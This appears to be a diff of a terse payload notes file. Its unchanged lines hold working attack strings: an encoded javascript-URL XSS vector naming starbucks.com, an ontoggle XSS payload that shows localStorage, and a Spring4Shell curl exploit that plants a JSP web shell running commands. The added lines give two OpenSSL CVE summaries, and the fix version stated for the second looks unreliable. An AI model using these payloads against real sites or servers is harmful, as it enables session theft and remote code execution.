@@ -1,3 +1,8 @@
 %19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529\
 ”ONxss=><details open ontoggle=prompt(JSON.stringify(localStorage))+x 2
 curl -k -X POST https://10.10.10.10:8767/ -H "suffix: %>s" -H "c1: Runtime" -H "c2: <%" --data-raw "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(%22id%22).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
+
+
+CVE-2024-5535: A buffer overread can occur when SSL_select_next_proto() is called with a zero-length client protocol list, potentially leading to application crashes or information disclosure. This issue is resolved in OpenSSL version 3.2.3.
+
+CVE-2024-12797: TLS and DTLS connections using raw public keys (RPKs) may fail to properly detect server authentication failures, enabling man-in-the-middle attacks. This vulnerability is fixed in OpenSSL version 3.2.3.
